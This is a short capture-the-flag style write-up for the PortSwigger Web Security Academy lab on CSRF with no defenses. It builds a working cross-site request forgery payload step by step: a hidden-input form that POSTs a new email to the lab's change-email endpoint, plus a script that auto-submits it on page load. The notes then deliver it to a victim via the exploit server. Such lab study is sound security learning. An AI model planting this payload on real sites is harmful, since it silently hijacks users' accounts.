# Lab: CSRF vulnerability with no defenses
# https://portswigger.net/web-security/csrf/lab-no-defenses
```bash
# Login with credentials and update your email.

a@gmail.com

```

```bash
# Check burp suite target and copy url of the change-email to write this part of our code. You can also see the method from burp suite.
<form 
method="POST" action="https://0a1e00de0375dbf681d06c6400d300fd.web-security-academy.net/my-account/change-email">
</form>

```
```bash
# From change email we can also see the format of email.(email=a%40gmail.com).

<form 
method="POST" action="https://0a1e00de0375dbf681d06c6400d300fd.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="virus@gmail.com">
</form>

# The input type="hidden" element is used in forms to include data that should be submitted with the form but is not visible or editable by the user.
```

```bash
<script>
        document.forms[0].submit();
</script>

# This JavaScript code automatically submits the form when the script is executed.


```

```bash
<form 
method="POST" action="https://0a1e00de0375dbf681d06c6400d300fd.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="virus@gmail.com">
</form>
<script>
        document.forms[0].submit();
</script>

# Go to exploit server and copy paste this into body and deliver to victim.

# embedded in a webpage, this script could be used to perform a CSRF attack.
# When a user visits the malicious page, their browser would automatically submit the form to the target site, potentially changing their email address without their consent.
```
